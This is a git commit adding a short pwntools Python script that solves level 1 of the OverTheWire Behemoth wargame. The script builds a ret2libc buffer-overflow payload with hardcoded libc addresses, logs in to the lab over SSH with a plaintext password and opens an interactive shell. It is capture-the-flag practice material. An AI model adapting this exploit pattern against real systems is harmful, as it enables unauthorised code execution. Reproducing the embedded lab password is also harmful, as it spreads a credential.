c0529bdac5746b26596ad76a4f634462d042e0be
sploitem <sploitem@gmail.com>
2018-10-28 09:23:10 -0400

    beh1

---
+++ overthewire.org/beh1.py
@@ -0,0 +1,17 @@
+#!/usr/bin/env python
+from pwn import *
+
+pad = 71
+system = p32(0xf7e4c850)
+binsh = p32(0xf7f6ecc8)
+
+payload = 'A'*pad
+payload += system
+payload += 'FAKE'
+payload += binsh
+
+shell = ssh('behemoth1', 'behemoth.labs.overthewire.org', password='aesebootiv', port=2221)
+p = shell.run('/behemoth/behemoth1')
+p.sendlineafter('Password: ', payload)
+p.interactive()
+shell.close()
